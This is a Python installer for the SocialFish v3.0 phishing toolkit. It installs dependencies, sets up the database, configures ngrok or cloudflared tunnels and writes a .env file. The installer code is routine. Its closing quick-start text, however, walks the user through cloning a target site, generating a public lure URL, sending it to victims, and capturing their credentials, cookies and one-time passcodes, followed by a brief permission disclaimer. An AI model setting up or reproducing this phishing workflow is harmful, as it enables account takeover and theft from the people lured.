#!/usr/bin/env python3
"""
SocialFish v3.0 Setup & Initialization Script
Handles dependency installation, database migration, and configuration
"""

import os
import sys
import subprocess
from pathlib import Path
import logging

logger = logging.getLogger("setup")
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

def print_banner():
    logger.info("""
    ╔═══════════════════════════════════════════╗
    ║     SocialFish v3.0 Setup Wizard          ║
    ║     Modern Dynamic Phishing Toolkit       ║
    ╚═══════════════════════════════════════════╝
    """)

def check_python():
    """Verify Python 3.8+"""
    if sys.version_info < (3, 8):
        logger.error("Python 3.8+ required")
        exit(1)
    logger.info(f"Python {sys.version.split()[0]} ✓")

def install_dependencies():
    """Install required packages"""
    logger.info("\n[*] Installing dependencies...")
    
    deps = [
        'flask==2.3.3',
        'flask-socketio>=5.3.0',
        'eventlet>=0.33.3',
        'playwright>=1.40.0',
        'pyngrok>=7.0.0',
        'python-dotenv>=1.0.0',
        'cryptography>=41.0.0',
        'selenium>=4.13.0',
        'webdriver-manager>=4.0.0'
    ]
    
    for dep in deps:
        try:
            __import__(dep.split('>=')[0].split('==')[0].replace('-', '_'))
            logger.info(f"[+] {dep.split('>=')[0]} already installed")
        except ImportError:
            logger.info(f"[*] Installing {dep}...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', dep], check=True)
    
    logger.info("[+] All dependencies installed ✓")

def install_playwright_browsers():
    """Install Playwright browsers"""
    logger.info("\n[*] Installing Playwright browsers...")
    logger.info("    (This may take a few minutes)")
    
    try:
        from playwright.sync_api import sync_playwright
        subprocess.run([sys.executable, '-m', 'playwright', 'install', 'chromium'], check=True)
        logger.info("[+] Chromium browser installed ✓")
    except Exception as e:
        logger.exception("Failed to install Playwright browsers: %s", e)
        logger.warning("You can manually run: playwright install chromium")

def initialize_database():
    """Initialize database schema"""
    logger.info("\n[*] Initializing database...")
    
    try:
        from core.db_migration import migrate_db
        db_path = os.getenv("DATABASE", "./database.db")
        migrate_db(db_path)
        logger.info(f"[+] Database initialized: {db_path} ✓")
    except Exception as e:
        logger.exception("Database initialization failed: %s", e)
        return False
    
    return True

def setup_tunneling():
    """Interactive tunnel setup"""
    logger.info("\n[*] Tunnel Setup (Optional)")
    logger.info("You can setup tunneling now or skip for local testing.")
    
    choice = input("\nSetup tunneling? (ngrok/cloudflared/skip) [skip]: ").strip().lower()
    
    if choice in ['ngrok', 'cloudflared']:
        try:
            from core.tunnel_manager import TunnelManager
            manager = TunnelManager()
            manager.interactive_setup()
            logger.info("[+] Tunnel configured ✓")
        except Exception as e:
            logger.exception("Tunnel setup failed: %s", e)
    else:
        logger.warning("Using localhost only. You can setup tunneling later with:")
        logger.warning("    python core/tunnel_manager.py setup")

def generate_config():
    """Create .env file if needed"""
    env_file = Path(".env")
    if not env_file.exists():
        logger.info("\n[*] Creating .env configuration...")
        env_content = """# SocialFish v3.0 Configuration
DATABASE=./database.db
FLASK_ENV=development
FLASK_DEBUG=0
SECRET_KEY=change-me-to-random-string

# Tunneling
NGROK_TOKEN=
CLOUDFLARED_TOKEN=

# Webhook
WEBHOOK_TIMEOUT=5
"""
        env_file.write_text(env_content)
        logger.info("[+] .env file created (configure as needed) ✓")

def print_next_steps():
    """Print quick-start guide"""
    logger.info("""
╔═══════════════════════════════════════════╗
║        Setup Complete! Next Steps:        ║
╚═══════════════════════════════════════════╝

1. Start the application:
   python SocialFish.py admin password

2. Access the web interface:
   http://localhost:5000/neptune
   
   Username: admin
   Password: password

3. Create your first template:
   - Go to /templates
   - Click "New Template"
   - Enter target URL
   - Choose cloning options
   - System will record the flow

4. Generate a lure URL:
   - Select template
   - Click "Lure" → "Tunnel"
   - Choose tunneling method
   - Copy generated URL

5. Send to victims:
   - Distribute lure URL
   - Monitor sessions in real-time
   - Capture credentials, cookies, OTP codes

For detailed documentation, see: FEATURES_v3.md

⚠️ Remember: Only test systems you own or have explicit permission to test.

    """)

def main():
    print_banner()
    check_python()
    
    try:
        install_dependencies()
        install_playwright_browsers()
        if initialize_database():
            setup_tunneling()
            generate_config()
            print_next_steps()
        else:
            logger.error("Setup incomplete. Try manual database setup:")
            logger.error("    python core/db_migration.py")
    except KeyboardInterrupt:
        logger.warning("Setup cancelled")
        exit(1)
    except Exception as e:
        logger.exception("Setup error: %s", e)
        exit(1)
